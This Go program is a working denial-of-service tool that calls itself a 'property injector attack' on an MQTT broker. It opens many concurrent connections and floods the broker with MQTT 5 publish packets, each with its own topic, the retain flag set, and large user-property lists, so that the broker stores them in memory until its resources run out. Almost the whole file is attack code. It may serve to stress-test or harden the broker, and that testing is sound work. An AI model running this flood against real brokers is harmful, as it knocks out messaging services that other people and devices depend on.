package main

import (
	"bytes"
	"flag"
	"fmt"
	"log"
	"net"
	"sync"
	"sync/atomic"
	"time"

	"github.com/mochi-mqtt/server/v2/packets"
)

var (
	brokerAddr      = flag.String("broker", "localhost:1883", "Broker address")
	concurrency     = flag.Int("concurrency", 10, "Number of concurrent attackers")
	durationSeconds = flag.Int("duration", 10, "Attack duration in seconds")
	propCount       = flag.Int("prop-count", 50, "Number of user properties per packet")
	keySize         = flag.Int("key-size", 100, "Size of each property key")
	valSize         = flag.Int("val-size", 100, "Size of each property value")
)

func main() {
	flag.Parse()

	log.Printf("Starting property injector attack against %s", *brokerAddr)
	log.Printf("Concurrency: %d, Duration: %ds", *concurrency, *durationSeconds)
	log.Printf("Properties per packet: %d (KeySize: %d, ValSize: %d)", *propCount, *keySize, *valSize)

	var wg sync.WaitGroup
	var totalSent uint64
	var totalErrors uint64

	start := time.Now()
	deadline := start.Add(time.Duration(*durationSeconds) * time.Second)

	for i := 0; i < *concurrency; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()

			// Pre-build the malicious properties
			props := make([]packets.UserProperty, 0, *propCount)
			
			keyBytes := make([]byte, *keySize)
			valBytes := make([]byte, *valSize)
			for i := range keyBytes { keyBytes[i] = 'k' }
			for i := range valBytes { valBytes[i] = 'v' }
			keyStr := string(keyBytes)
			valStr := string(valBytes)

			for j := 0; j < *propCount; j++ {
				props = append(props, packets.UserProperty{
					Key: keyStr,
					Val: valStr,
				})
			}

			for time.Now().Before(deadline) {
				// Connect directly via TCP
				conn, err := net.Dial("tcp", *brokerAddr)
				if err != nil {
					atomic.AddUint64(&totalErrors, 1)
					time.Sleep(100 * time.Millisecond)
					continue
				}

				// Send MQTT 5 CONNECT
				connectPk := packets.Packet{
					ProtocolVersion: 5,
					FixedHeader: packets.FixedHeader{
						Type: packets.Connect,
					},
					Connect: packets.ConnectParams{
						ProtocolName:     []byte("MQTT"),
						Clean:            true,
						Keepalive:        60,
						ClientIdentifier: fmt.Sprintf("attacker-%d-%d", id, time.Now().UnixNano()),
					},
				}
				var cbuf bytes.Buffer
				connectPk.ConnectEncode(&cbuf)
				conn.Write(cbuf.Bytes())

				// Rapidly fire malicious packets with unique topics to force retention
				for time.Now().Before(deadline) {
					pk := packets.Packet{
						ProtocolVersion: 5,
						FixedHeader: packets.FixedHeader{
							Type:   packets.Publish,
							Qos:    0,
							Retain: true, // Force broker to store it in memory
						},
						TopicName: fmt.Sprintf("test/attack/%d/%d", id, atomic.LoadUint64(&totalSent)),
						Payload:   []byte("malicious"),
						Properties: packets.Properties{
							User: props,
						},
					}

					var buf bytes.Buffer
					if err := pk.PublishEncode(&buf); err != nil {
						atomic.AddUint64(&totalErrors, 1)
						break
					}

					_, err := conn.Write(buf.Bytes())
					if err != nil {
						atomic.AddUint64(&totalErrors, 1)
						break
					}
					atomic.AddUint64(&totalSent, 1)
					time.Sleep(1 * time.Millisecond)
				}
				conn.Close()
			}
		}(i)
	}

	wg.Wait()
	duration := time.Since(start).Seconds()

	fmt.Printf("SUMMARY duration_seconds=%.2f total_sent=%d total_errors=%d\n",
		duration, atomic.LoadUint64(&totalSent), atomic.LoadUint64(&totalErrors))
}
